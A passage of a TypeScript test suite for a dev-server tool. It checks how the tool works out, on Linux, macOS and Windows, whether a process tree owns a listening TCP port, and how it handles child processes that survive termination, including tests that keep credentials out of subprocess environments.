    const announced = await announcement(child);

    expect(announced.port).toBe(port);
    expect(await ownership.ownsListener(announced.pid, port)).toBe(false);
    expect(await ownership.ownsListener(process.pid, port)).toBe(true);
  });

  it('answers false for a closed port: no listener is visible although /proc is', async () => {
    const ownership = createListenerOwnership();
    const { server, port } = await listenHere();
    await new Promise<void>((resolve) => {
      server.close(() => {
        resolve();
      });
    });
    localServers.splice(localServers.indexOf(server), 1);

    expect(await ownership.ownsListener(process.pid, port)).toBe(false);
  });

  it('answers false for a root that no longer exists while something listens', async () => {
    const ownership = createListenerOwnership();
    const { port } = await listenHere();
    const idle = spawnHelper(IDLE_SCRIPT);
    const { pid } = await announcement(idle);
    await stopHelper(idle);

    expect(await ownership.ownsListener(pid, port)).toBe(false);
  });
});

/** A `/proc/net/tcp` header, as the kernel prints it. */
const TCP_HEADER =
  '  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode';

/** One `/proc/net/tcp` row: a 127.0.0.1 socket on `port` in `state` with `inode`. */
function tcpRow(index: number, port: number, state: string, inode: string): string {
  const portHex = port.toString(16).toUpperCase().padStart(4, '0');
  return `   ${String(index)}: 0100007F:${portHex} 00000000:0000 ${state} 00000000:00000000 00:00000000 00000000  1000        0 ${inode} 1 0000000000000000 100 0 0 10 0`;
}

/** A socket table holding `rows`, with the header. */
function tcpTable(...rows: readonly string[]): string {
  return [TCP_HEADER, ...rows, ''].join('\n');
}

/** An errno-coded error, as `node:fs` rejects with. */
function errnoError(code: string): Error {
  return Object.assign(new Error(`${code}: injected`), { code });
}

/**
 * An in-memory `/proc`: files, directories and links by absolute path. A path
 * it does not hold rejects with `ENOENT`; one listed in `denied`, `EACCES`.
 * Every call is recorded.
 */
function fakeProc(spec: {
  readonly files?: Readonly<Record<string, string>>;
  readonly dirs?: Readonly<Record<string, readonly string[]>>;
  readonly links?: Readonly<Record<string, string>>;
  readonly denied?: readonly string[];
}): { readonly fs: ListenerOwnershipFs; readonly calls: string[] } {
  const calls: string[] = [];
  const read = <T>(kind: string, table: Readonly<Record<string, T>> | undefined, path: string) => {
    calls.push(`${kind} ${path}`);
    if (spec.denied?.includes(path) === true) {
      return Promise.reject(errnoError('EACCES'));
    }
    return table !== undefined && Object.hasOwn(table, path)
      ? Promise.resolve(table[path] as T)
      : Promise.reject(errnoError('ENOENT'));
  };
  return {
    calls,
    fs: {
      readFile: (path) => read('readFile', spec.files, path),
      readdir: (path) => read('readdir', spec.dirs, path),
      readlink: (path) => read('readlink', spec.links, path),
    },
  };
}

/**
 * A small process tree — `100` (the root) → `101` → `102`, and an unrelated
 * `300` — with `102` holding socket `555` and `300` holding socket `777`,
 * exposed through per-thread `children` lists (thread `105` of `100` is the
 * one that started `101`).
 */
function treeProc(
  tcp: string,
  overrides: {
    readonly files?: Readonly<Record<string, string>>;
    readonly dirs?: Readonly<Record<string, readonly string[]>>;
    readonly denied?: readonly string[];
  } = {},
) {
  return fakeProc({
    files: {
      '/proc/net/tcp': tcp,
      '/proc/100/task/100/children': '',
      '/proc/100/task/105/children': '101 ',
      '/proc/101/task/101/children': '102',
      '/proc/102/task/102/children': '',
      ...overrides.files,
    },
    dirs: {
      '/proc/100/task/100': ['children', 'stat', 'status'],
      '/proc/100/task': ['100', '105'],
      '/proc/101/task': ['101'],
      '/proc/102/task': ['102'],
      '/proc/100/fd': ['0', '1', '2'],
      '/proc/101/fd': ['0', '1'],
      '/proc/102/fd': ['0', '1', '2', '21'],
      ...overrides.dirs,
    },
    links: {
      '/proc/100/fd/0': '/dev/null',
      '/proc/100/fd/1': 'pipe:[900]',
      '/proc/100/fd/2': 'pipe:[901]',
      '/proc/101/fd/0': '/dev/null',
      '/proc/101/fd/1': 'pipe:[902]',
      '/proc/102/fd/0': '/dev/null',
      '/proc/102/fd/1': 'pipe:[903]',
      '/proc/102/fd/2': 'socket:[444]',
      '/proc/102/fd/21': 'socket:[555]',
    },
    ...(overrides.denied === undefined ? {} : { denied: overrides.denied }),
  });
}

describe('createListenerOwnership on Linux (injected /proc)', () => {
  it('owns a port whose only listener a descendant holds, walking every thread’s children list', async () => {
    const proc = treeProc(tcpTable(tcpRow(0, 4173, '0A', '555'), tcpRow(1, 4173, '01', '556')));
    const ownership = createListenerOwnership({ platform: 'linux', fs: proc.fs });

    expect(await ownership.ownsListener(100, 4173)).toBe(true);
    expect(proc.calls).toContain('readFile /proc/100/task/105/children');
    // tcp6 is absent (IPv6 disabled): that family simply holds no socket.
    expect(proc.calls).toContain('readFile /proc/net/tcp6');
  });

  it('denies a port when any listener on it is outside the tree', async () => {
    const proc = treeProc(tcpTable(tcpRow(0, 4173, '0A', '555'), tcpRow(1, 4173, '0A', '777')));
    const ownership = createListenerOwnership({ platform: 'linux', fs: proc.fs });

    expect(await ownership.ownsListener(100, 4173)).toBe(false);
  });

  it('answers false for a port with no listener, without walking any tree', async () => {
    const proc = treeProc(tcpTable(tcpRow(0, 4174, '0A', '555')));
    const ownership = createListenerOwnership({ platform: 'linux', fs: proc.fs });

    expect(await ownership.ownsListener(100, 4173)).toBe(false);
    expect(proc.calls.some((call) => call.includes('/task'))).toBe(false);
  });

  it('answers false when the root has exited: nothing is in its tree', async () => {
    const proc = treeProc(tcpTable(tcpRow(0, 4173, '0A', '555')));
    const ownership = createListenerOwnership({ platform: 'linux', fs: proc.fs });

    expect(await ownership.ownsListener(999, 4173)).toBe(false);
  });

  it('falls back to every /proc/<pid>/stat parent pid on a kernel without children lists, reading past the last ")"', async () => {
    const proc = fakeProc({
      files: {
        '/proc/net/tcp': tcpTable(tcpRow(0, 4173, '0A', '555')),
        '/proc/100/stat': '100 (pnpm) S 1 100 100 0 -1 4194304',
        '/proc/101/stat': '101 (node (dev) ) server) S 100 100 100 0 -1 4194304',
        '/proc/300/stat': '300 (other) S 1 300 300 0 -1 4194304',
      },
      dirs: {
        '/proc/100/task/100': ['stat', 'status'],
        '/proc': ['1', '100', '101', '300', 'self', 'net'],
        '/proc/100/fd': ['0'],
        '/proc/101/fd': ['7'],
      },
      links: { '/proc/100/fd/0': '/dev/null', '/proc/101/fd/7': 'socket:[555]' },
    });
    const ownership = createListenerOwnership({ platform: 'linux', fs: proc.fs });

    expect(await ownership.ownsListener(100, 4173)).toBe(true);
    expect(await ownership.ownsListener(300, 4173)).toBe(false);
    expect(proc.calls).toContain('readFile /proc/101/stat');
  });

  it('cannot tell when a tree process’s descriptors are denied and the listener was not found elsewhere', async () => {
    const proc = treeProc(tcpTable(tcpRow(0, 4173, '0A', '555')), {
      denied: ['/proc/102/fd'],
    });
    const ownership = createListenerOwnership({ platform: 'linux', fs: proc.fs });

    expect(await ownership.ownsListener(100, 4173)).toBeUndefined();
  });

  const malformed: readonly { readonly label: string; readonly tcp: string }[] = [
    { label: 'a table without its header', tcp: tcpRow(0, 4173, '0A', '555') },
    { label: 'a row with too few columns', tcp: tcpTable('   0: 0100007F:105D 00000000:0000 0A') },
    { label: 'a non-hexadecimal state', tcp: tcpTable(tcpRow(0, 4173, 'ZZ', '555')) },
    {
      label: 'a malformed local address',
      tcp: tcpTable(tcpRow(0, 4173, '0A', '555').replace('0100007F:', '1.2.3.4:')),
    },
    { label: 'a listener with inode 0', tcp: tcpTable(tcpRow(0, 4173, '0A', '0')) },
  ];

  it.each(malformed)('cannot tell from $label', async ({ tcp }) => {
    const ownership = createListenerOwnership({ platform: 'linux', fs: treeProc(tcp).fs });

    expect(await ownership.ownsListener(100, 4173)).toBeUndefined();
  });

  it('cannot tell when neither socket table exists, or one cannot be read', async () => {
    const none = fakeProc({ dirs: { '/proc/100/task/100': ['children'] } });
    const denied = treeProc(tcpTable(tcpRow(0, 4173, '0A', '555')), { denied: ['/proc/net/tcp6'] });

    expect(
      await createListenerOwnership({ platform: 'linux', fs: none.fs }).ownsListener(100, 4173),
    ).toBeUndefined();
    expect(
      await createListenerOwnership({ platform: 'linux', fs: denied.fs }).ownsListener(100, 4173),
    ).toBeUndefined();
  });

  it('cannot tell from a children list that is not decimal pids', async () => {
    const proc = treeProc(tcpTable(tcpRow(0, 4173, '0A', '555')), {
      files: { '/proc/101/task/101/children': 'one two' },
    });

    expect(
      await createListenerOwnership({ platform: 'linux', fs: proc.fs }).ownsListener(100, 4173),
    ).toBeUndefined();
  });

  it.each([
    { label: 'port 0', pid: 100, port: 0 },
    { label: 'port 65536', pid: 100, port: 65_536 },
    { label: 'a fractional port', pid: 100, port: 41.5 },
    { label: 'pid 0', pid: 0, port: 4173 },
    { label: 'a negative pid', pid: -100, port: 4173 },
  ])('refuses $label without reading anything', async ({ pid, port }) => {
    const proc = treeProc(tcpTable(tcpRow(0, 4173, '0A', '555')));

    expect(
      await createListenerOwnership({ platform: 'linux', fs: proc.fs }).ownsListener(pid, port),
    ).toBeUndefined();
    expect(proc.calls).toEqual([]);
  });

  it('never rejects, even when the filesystem port throws synchronously', async () => {
    const throwing: ListenerOwnershipFs = {
      readFile: () => {
        throw new Error('no fs');
      },
      readdir: () => {
        throw new Error('no fs');
      },
      readlink: () => {
        throw new Error('no fs');
      },
    };

    expect(
      await createListenerOwnership({ platform: 'linux', fs: throwing }).ownsListener(100, 4173),
    ).toBeUndefined();
  });
});

/** A scripted command runner: each call takes the next outcome (or throws/rejects), recording the call. */
function scriptedCommands(
  ...outcomes: readonly (ListenerOwnershipCommandOutcome | Error | 'hang')[]
): {
  readonly run: ListenerOwnershipRunCommand;
  readonly calls: {
    readonly file: string;
    readonly args: readonly string[];
    readonly options: ListenerOwnershipCommandOptions;
  }[];
} {
  const calls: {
    readonly file: string;
    readonly args: readonly string[];
    readonly options: ListenerOwnershipCommandOptions;
  }[] = [];
  const queue = [...outcomes];
  const run: ListenerOwnershipRunCommand = (file, args, options) => {
    calls.push({ file, args, options });
    const next = queue.shift();
    if (next === undefined) {
      return Promise.reject(new Error('no scripted outcome left'));
    }
    if (next === 'hang') {
      return Promise.resolve({ exitCode: null, stdout: '', timedOut: true });
    }
    return next instanceof Error ? Promise.reject(next) : Promise.resolve(next);
  };
  return { run, calls };
}

/** A command that exited with `exitCode`, printing `stdout`. */
function exited(exitCode: number, stdout: string): ListenerOwnershipCommandOutcome {
  return { exitCode, stdout, timedOut: false };
}

/** `ps -A -o pid= -o ppid=` for the tree 500 → 501 → 502, plus launchd (1) and an unrelated 777. */
const PS_TABLE = [
  '    1     0',
  '  500     1',
  '  501   500',
  '  502   501',
  '  777     1',
  '',
].join('\n');

describe('createListenerOwnership on macOS and other POSIX systems (lsof + ps)', () => {
  it('owns a port every lsof holder of which is in the tree, running both tools without a shell at fixed macOS paths', async () => {
    const commands = scriptedCommands(exited(0, 'p502\nf21\np501\nf9\n'), exited(0, PS_TABLE));
    const ownership = createListenerOwnership({
      platform: 'darwin',
      runCommand: commands.run,
      env: { PATH: '/usr/bin' },
    });

    expect(await ownership.ownsListener(500, 4173)).toBe(true);
    expect(commands.calls.map(({ file, args }) => [file, args])).toEqual([
      ['/usr/sbin/lsof', ['-nP', '-iTCP:4173', '-sTCP:LISTEN', '-Fp']],
      ['/bin/ps', ['-A', '-o', 'pid=', '-o', 'ppid=']],
    ]);
    expect(commands.calls[0]?.options).toStrictEqual({
      timeoutMs: DEFAULT_LISTENER_LOOKUP_TIMEOUT_MS,
      env: { PATH: '/usr/bin' },
    });
  });

  it('runs the lookup tools with the dev-server allowlist only, never a service credential', async () => {
    const serviceEnv = {
      PATH: '/usr/bin',
      LANG: 'en_US.UTF-8',
      ANTHROPIC_API_KEY: fixtureSecret('provider'),
      DEBUGGEN_HOME: '/home/dev/.debuggen',
      GITHUB_TOKEN: fixtureSecret('forge'),
    };
    const posix = scriptedCommands(exited(0, 'p502\n'), exited(0, PS_TABLE));
    await createListenerOwnership({
      platform: 'darwin',
      runCommand: posix.run,
      env: serviceEnv,
    }).ownsListener(500, 4173);
    const windows = scriptedCommands(exited(0, ''));
    await createListenerOwnership({
      platform: 'win32',
      runCommand: windows.run,
      env: {
        Path: 'C:\\Windows\\System32',
        SystemRoot: 'C:\\Windows',
        Anthropic_Api_Key: fixtureSecret('provider'),
        DEBUGGEN_HOME: 'C:\\Users\\dev\\.debuggen',
        GITHUB_TOKEN: fixtureSecret('forge'),
      },
    }).ownsListener(500, 4173);

    expect(posix.calls).toHaveLength(2);
    for (const { options } of posix.calls) {
      expect(options.env).toStrictEqual({ PATH: '/usr/bin', LANG: 'en_US.UTF-8' });
    }
    expect(windows.calls).toHaveLength(1);
    expect(windows.calls[0]?.options.env).toStrictEqual({
      Path: 'C:\\Windows\\System32',
      SystemRoot: 'C:\\Windows',
    });
    const serialized = JSON.stringify([...posix.calls, ...windows.calls]);
    expect(serialized).not.toContain(fixtureSecret('provider'));
    expect(serialized).not.toContain(fixtureSecret('forge'));
    expect(serialized).not.toContain('DEBUGGEN_HOME');
  });

  it('denies a port one holder of which is outside the tree', async () => {
    const commands = scriptedCommands(exited(0, 'p502\np777\n'), exited(0, PS_TABLE));

    expect(
      await createListenerOwnership({ platform: 'darwin', runCommand: commands.run }).ownsListener(
        500,
        4173,
      ),
    ).toBe(false);
  });

  it('answers false for lsof’s empty exit 1 — no listener — without listing processes', async () => {
    const commands = scriptedCommands(exited(1, ''));

    expect(
      await createListenerOwnership({ platform: 'darwin', runCommand: commands.run }).ownsListener(
        500,
        4173,
      ),
    ).toBe(false);
    expect(commands.calls).toHaveLength(1);
  });

  const unusable: readonly {
    readonly label: string;
    readonly outcomes: readonly (ListenerOwnershipCommandOutcome | Error | 'hang')[];
  }[] = [
    { label: 'garbage from lsof', outcomes: [exited(0, 'COMMAND PID USER\nnode 502 dev\n')] },
    { label: 'lsof exiting 0 with no holder', outcomes: [exited(0, '\n')] },
    { label: 'lsof exiting 1 with output', outcomes: [exited(1, 'p502\n')] },
    { label: 'lsof exiting 2', outcomes: [exited(2, '')] },
    { label: 'lsof failing to start', outcomes: [{ exitCode: null, stdout: '', timedOut: false }] },
    { label: 'lsof timing out', outcomes: ['hang'] },
    { label: 'lsof rejecting', outcomes: [new Error('spawn lsof ENOENT')] },
    { label: 'garbage from ps', outcomes: [exited(0, 'p502\n'), exited(0, 'PID PPID\n502 1\n')] },
    { label: 'ps exiting non-zero', outcomes: [exited(0, 'p502\n'), exited(1, PS_TABLE)] },
    { label: 'ps timing out', outcomes: [exited(0, 'p502\n'), 'hang'] },
    { label: 'an empty ps table', outcomes: [exited(0, 'p502\n'), exited(0, '')] },
  ];

  it.each(unusable)('cannot tell from $label', async ({ outcomes }) => {
    const commands = scriptedCommands(...outcomes);

    expect(
      await createListenerOwnership({ platform: 'darwin', runCommand: commands.run }).ownsListener(
        500,
        4173,
      ),
    ).toBeUndefined();
  });

  it('finds lsof and ps on the service PATH on other POSIX systems, with an injected timeout', async () => {
    const commands = scriptedCommands(exited(0, 'p501\n'), exited(0, PS_TABLE));
    const ownership = createListenerOwnership({
      platform: 'freebsd',
      runCommand: commands.run,
      commandTimeoutMs: 750,
    });

    expect(await ownership.ownsListener(500, 4173)).toBe(true);
    expect(commands.calls.map(({ file }) => file)).toEqual(['lsof', 'ps']);
    expect(commands.calls.every(({ options }) => options.timeoutMs === 750)).toBe(true);
  });

  it('answers false when the root is not in the process table: it has exited', async () => {
    const commands = scriptedCommands(exited(0, 'p502\n'), exited(0, PS_TABLE));

    expect(
      await createListenerOwnership({ platform: 'darwin', runCommand: commands.run }).ownsListener(
        4_242,
        4173,
      ),
    ).toBe(false);
  });

  it('interpolates nothing but the validated port, and runs nothing for an invalid one', async () => {
    const commands = scriptedCommands(exited(1, ''));
    const ownership = createListenerOwnership({ platform: 'darwin', runCommand: commands.run });

    expect(await ownership.ownsListener(500, Number.NaN)).toBeUndefined();
    expect(await ownership.ownsListener(500, 70_000)).toBeUndefined();
    expect(commands.calls).toEqual([]);
  });
});

/** The Windows script's output for listeners `pids` over the tree 400 → 500 → 600, plus System (4). */
function windowsOutput(listeners: readonly number[], end = 'END'): string {
  return [
    ...listeners.map((pid) => `L ${String(pid)}`),
    'P 0 0',
    'P 4 0',
    'P 400 4',
    'P 500 400',
    'P 600 500',
    'P 777 4',
    end,
    '',
  ].join('\r\n');
}

describe('createListenerOwnership on Windows (one fixed PowerShell query)', () => {
  const WINDOWS_ENV: ParentEnvironment = Object.freeze({
    SystemRoot: 'C:\\Windows',
    Path: 'C:\\Windows\\System32',
  });

  it('owns a port whose listeners the tree holds, running PowerShell from SystemRoot without a profile', async () => {
    const commands = scriptedCommands(exited(0, windowsOutput([600, 500])));
    const ownership = createListenerOwnership({
      platform: 'win32',
      runCommand: commands.run,
      env: WINDOWS_ENV,
    });

    expect(await ownership.ownsListener(400, 4173)).toBe(true);
    const call = commands.calls[0];
    expect(call?.file).toBe('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe');
    expect(call?.args.slice(0, 3)).toEqual(['-NoProfile', '-NonInteractive', '-Command']);
    expect(call?.args).toHaveLength(4);
    expect(call?.args[3]).toContain('Get-NetTCPConnection -State Listen -LocalPort 4173');
    expect(call?.args[3]).toContain('Get-CimInstance -ClassName Win32_Process');
    expect(call?.args[3]).not.toMatch(/"/);
  });

  it('denies a port a process outside the tree listens on (for example System, pid 4)', async () => {
    const commands = scriptedCommands(exited(0, windowsOutput([600, 4])));

    expect(
      await createListenerOwnership({
        platform: 'win32',
        runCommand: commands.run,
        env: WINDOWS_ENV,
      }).ownsListener(400, 4173),
    ).toBe(false);
  });

  it('answers false for a port with no listener', async () => {
    const commands = scriptedCommands(exited(0, windowsOutput([])));

    expect(
      await createListenerOwnership({
        platform: 'win32',
        runCommand: commands.run,
        env: WINDOWS_ENV,
      }).ownsListener(400, 4173),
    ).toBe(false);
  });

  const unusable: readonly {
    readonly label: string;
    readonly outcome: ListenerOwnershipCommandOutcome | Error | 'hang';
  }[] = [
    { label: 'output cut short (no END)', outcome: exited(0, windowsOutput([600], '')) },
    {
      label: 'an unexpected line',
      outcome: exited(0, `Get-NetTCPConnection : error\r\n${windowsOutput([600])}`),
    },
    { label: 'no process table', outcome: exited(0, 'L 600\r\nEND\r\n') },
    { label: 'a non-zero exit', outcome: exited(1, windowsOutput([600])) },
    { label: 'a timeout', outcome: 'hang' },
    { label: 'a rejected run', outcome: new Error('spawn powershell.exe ENOENT') },
  ];

  it.each(unusable)('cannot tell from $label', async ({ outcome }) => {
    const commands = scriptedCommands(outcome);

    expect(
      await createListenerOwnership({
        platform: 'win32',
        runCommand: commands.run,
        env: WINDOWS_ENV,
      }).ownsListener(400, 4173),
    ).toBeUndefined();
  });

  it.each([
    { label: 'no SystemRoot', env: { Path: 'C:\\Windows' } },
    { label: 'a relative SystemRoot', env: { SystemRoot: 'Windows' } },
    { label: 'a SystemRoot with an expansion', env: { SystemRoot: 'C:\\%WINDIR%' } },
    { label: 'a SystemRoot with whitespace', env: { SystemRoot: 'C:\\My Windows' } },
  ])('falls back to powershell.exe on the search path for $label', async ({ env }) => {
    const commands = scriptedCommands(exited(0, windowsOutput([500])));

    await createListenerOwnership({
      platform: 'win32',
      runCommand: commands.run,
      env,
    }).ownsListener(400, 4173);

    expect(commands.calls[0]?.file).toBe('powershell.exe');
  });
});

// ---------------------------------------------------------------------------
// Best-effort diagnostics: a throwing logger, refused signals, the backstop
// ---------------------------------------------------------------------------

describe('DevServerLauncher: failures on the termination path are recorded, never swallowed', () => {
  it('records each signal the child refused, and carries the count into the termination record and report', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ children: [{ killThrows: true }], deps: { stopGraceMs: 100 } });
    const { child } = await launchReady(harness);

    const stopping = harness.launcher.stopAll();
    await vi.advanceTimersByTimeAsync(100 + 2_000);
    const lastSignalFailure = {
      signal: 'SIGKILL',
      refusal: 'threw',
      errorClass: 'SystemError',
      errorCode: 'ESRCH',
    };
    await expect(stopping).resolves.toStrictEqual({
      survivors: [
        { projectRoot: harness.projectRoot, pid: FIRST_PID, signalFailures: 2, lastSignalFailure },
      ],
    });

    const refused = harness.records.filter(
      (record) => record.message === 'A signal could not be delivered to a launched dev server',
    );
    expect(refused.map((record) => [record.level, record.fields])).toEqual([
      [
        'warn',
        expect.objectContaining({
          pid: FIRST_PID,
          signal: 'SIGTERM',
          refusal: 'threw',
          errorClass: 'SystemError',
          errorCode: 'ESRCH',
        }),
      ],
      [
        'warn',
        expect.objectContaining({
          pid: FIRST_PID,
          signal: 'SIGKILL',
          refusal: 'threw',
          errorClass: 'SystemError',
          errorCode: 'ESRCH',
        }),
      ],
    ]);
    const survived = harness.records.find(
      (record) => record.message === 'A launched dev server did not stop',
    );
    expect(survived?.fields).toMatchObject({ signalFailures: 2, lastSignalFailure });
    // The refusal's own text never reaches a record.
    expect(serializedRecords(harness.records)).not.toContain('kill ESRCH');
    child.finish(null, 'SIGKILL');
  });

  it.each([
    { label: 'cannot be spawned at all', failure: 'throws' },
    { label: 'reports a spawn error', failure: 'emits' },
  ] as const)(
    'reports a Windows tree backstop that $label, and still settles the stop',
    async ({ failure }) => {
      vi.useFakeTimers();
      const harness = createHarness({
        children: [{ exitsOn: [] }],
        deps: { platform: 'win32', stopGraceMs: 100 },
      });
      const { child } = await launchReady(harness);
      if (failure === 'throws') {
        harness.spawner.spawn.mockImplementationOnce(() => {
          throw Object.assign(new Error('spawn taskkill EACCES'), { code: 'EACCES' });
        });
      }

      const stopping = harness.launcher.stopAll();
      await vi.advanceTimersByTimeAsync(100);
      if (failure === 'emits') {
        const taskkill = await harness.spawner.child(1);
        expect(harness.spawner.call(1).command).toBe('taskkill');
        taskkill.failToSpawn('ENOENT');
      }
      await vi.advanceTimersByTimeAsync(2_000);
      // Both signals were delivered, yet no exit followed: still running.
      await expect(stopping).resolves.toStrictEqual({
        survivors: [{ projectRoot: harness.projectRoot, pid: FIRST_PID, signalFailures: 0 }],
      });

      const backstop = harness.records.find(
        (record) => record.message === 'The Windows process-tree backstop could not run',
      );
      expect(backstop?.level).toBe('warn');
      expect(backstop?.fields).toMatchObject({
        pid: FIRST_PID,
        errorClass: 'SystemError',
        errorCode: failure === 'throws' ? 'EACCES' : 'ENOENT',
      });
      const serialized = serializedRecords(harness.records);
      expect(serialized).not.toContain('spawn taskkill EACCES');
      expect(serialized).not.toContain('spawn ENOENT');
      expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'failed' }]);
      child.finish(1, null);
      expect(harness.launcher.list()).toEqual([]);
    },
  );
});

// ---------------------------------------------------------------------------
// A child that outlives its termination
// ---------------------------------------------------------------------------

describe('DevServerLauncher: a child that outlives its termination', () => {
  /** The grace period plus the bounded wait for an exit after SIGKILL, at the harness grace. */
  const LADDER_MS = 100 + 2_000;

  it('answers stop with a survived-termination Err, keeps it listed and revoked, and forgets it once it exits', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ children: [{ killThrows: true }], deps: { stopGraceMs: 100 } });
    const { child } = await launchReady(harness);
    const token = harness.issuer.tokens[0] ?? '';

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(LADDER_MS);
    const error = expectErr(await stopping, 'DEV_SERVER_LAUNCH_FAILED', 'survived-termination');

    expect(error.message).toBe('The launched dev server did not stop.');
    expect(error.details).toStrictEqual({
      reason: 'survived-termination',
      pid: FIRST_PID,
      pids: [FIRST_PID],
      signalFailures: 2,
    });
    expect(error.hint).toContain(String(FIRST_PID));
    expect(errorSurfaces(error)).not.toContain('kill ESRCH');
    expect(child.signals).toEqual(['SIGTERM', 'SIGKILL']);
    // Its credential is revoked, so its preload is inert, but it is not forgotten.
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke.mock.calls[0]?.[0]).toMatchObject({
      projectRoot: harness.projectRoot,
      token,
    });
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'failed' }]);
    const survived = harness.records.find(
      (record) => record.message === 'A launched dev server did not stop',
    );
    expect(survived?.level).toBe('error');
    expect(survived?.fields).toMatchObject({
      projectRoot: harness.projectRoot,
      pid: FIRST_PID,
      reason: 'stop-requested',
      escalated: true,
      exitObserved: false,
      signalFailures: 2,
    });

    // stopAll tries again — the whole ladder — and reports it still running.
    const retrying = harness.launcher.stopAll();
    await vi.advanceTimersByTimeAsync(LADDER_MS);
    await expect(retrying).resolves.toMatchObject({
      survivors: [{ projectRoot: harness.projectRoot, pid: FIRST_PID, signalFailures: 4 }],
    });
    expect(child.signals).toEqual(['SIGTERM', 'SIGKILL', 'SIGTERM', 'SIGKILL']);

    // dispose runs one more ladder for it, not two, and reports it.
    const disposing = harness.launcher.dispose();
    await vi.advanceTimersByTimeAsync(LADDER_MS);
    await expect(disposing).resolves.toMatchObject({
      survivors: [{ projectRoot: harness.projectRoot, pid: FIRST_PID, signalFailures: 6 }],
    });
    expect(child.signals).toHaveLength(6);
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'failed' }]);

    // Its exit, when it finally comes, removes it; the credential stays revoked once.
    child.finish(null, 'SIGKILL');
    expect(harness.launcher.list()).toEqual([]);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('counts a signal kill() did not deliver, and reports the survivor to stopForSession', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      children: [{ killDelivers: false }],
      deps: { stopGraceMs: 100 },
    });
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });

    const ending = harness.launcher.stopForSession('ses-alpha');
    await vi.advanceTimersByTimeAsync(LADDER_MS);

    // The session's end answers the survivor as the same survived-termination
    // failure `stop` gives — never as a stopped child.
    const error = expectErr(await ending, 'DEV_SERVER_LAUNCH_FAILED', 'survived-termination');
    expect(error.details).toStrictEqual({
      reason: 'survived-termination',
      pid: FIRST_PID,
      pids: [FIRST_PID],
      signalFailures: 2,
    });
    expect(
      harness.records.find((record) => record.message === 'A launched dev server did not stop')
        ?.fields,
    ).toMatchObject({
      projectRoot: harness.projectRoot,
      pid: FIRST_PID,
      reason: 'session-ended',
      signalFailures: 2,
      lastSignalFailure: { signal: 'SIGKILL', refusal: 'not-delivered' },
    });
    const refused = harness.records.filter(
      (record) => record.message === 'A signal could not be delivered to a launched dev server',
    );
    expect(refused.map((record) => record.fields)).toEqual([
      expect.objectContaining({ pid: FIRST_PID, signal: 'SIGTERM', refusal: 'not-delivered' }),
      expect.objectContaining({ pid: FIRST_PID, signal: 'SIGKILL', refusal: 'not-delivered' }),
    ]);
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'failed' }]);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);

    child.finish(0, null);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('retries a survivor before a relaunch, refuses while it lives, and spawns once it is gone', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ children: [{ killThrows: true }], deps: { stopGraceMs: 100 } });
    const { child } = await launchReady(harness);
    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(LADDER_MS);
    expectErr(await stopping, 'DEV_SERVER_LAUNCH_FAILED', 'survived-termination');

    const relaunching = harness.launcher.launch({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(LADDER_MS);
    const refused = expectErr(
      await relaunching,
      'DEV_SERVER_LAUNCH_FAILED',
      'survived-termination',
    );

    expect(refused.details).toMatchObject({ pid: FIRST_PID, signalFailures: 4 });
    expect(child.signals).toHaveLength(4);
    expect(harness.spawner.spawn).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'failed' }]);

    child.finish(null, 'SIGKILL');
    vi.useRealTimers();
    const { launch } = await launchReady(harness, {}, 1);
    expect(launch).toMatchObject({ alreadyRunning: false, pid: FIRST_PID + 1 });
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID + 1, status: 'ready' }]);
  });

  it('reports a start that timed out and then survived its stop as still running, not as stopped', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ children: [{ killThrows: true }], deps: { stopGraceMs: 100 } });

    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    // The ready timeout (5 s in the harness), then the termination ladder.
    await vi.advanceTimersByTimeAsync(5_000 + LADDER_MS);

    const error = expectErr(await pending, 'DEV_SERVER_LAUNCH_FAILED', 'survived-termination');
    expect(error.details).toMatchObject({ pid: FIRST_PID });
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'failed' }]);
    expect(
      harness.records.find((record) => record.message === 'A launched dev server did not stop')
        ?.fields,
    ).toMatchObject({ reason: 'ready-timeout', pid: FIRST_PID });
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);

    child.finish(null, 'SIGKILL');
    expect(harness.launcher.list()).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Process-group identity after the leader exits (CWE-367)
// ---------------------------------------------------------------------------

/** The first child's start token: the identity its group is pinned by while it lives. */
const LEADER_TOKEN = 'start-a-leader';

/** A server worker the first child started in its own group. */
const WORKER_PID = FIRST_PID + 1;

/** The worker's start token. */
const WORKER_TOKEN = 'start-a-worker';

/** What leads a recycled group of the same id: the same pid, a later start. */
const RECYCLED_TOKEN = 'start-b-unrelated';

/** The message of the one record a group that could not be verified leaves. */
const UNVERIFIED_GROUP_MESSAGE =
  "A launched dev server's process group could not be verified after its leader exited, so it is not signalled";

/**
 * A process table a case edits by hand, with a recording group signaller and
 * an inspector over it — so no fake pid ever reaches the host. The signaller
 * throws `ESRCH`, as `process.kill` does, for a group no process holds, and
 * hands every delivered signal to `onSignal`, where a case decides who it
 * ends. While `unlistable` is set, the inspector cannot tell.
 */
class ProcessTable {
  processes: ProcessIdentity[];
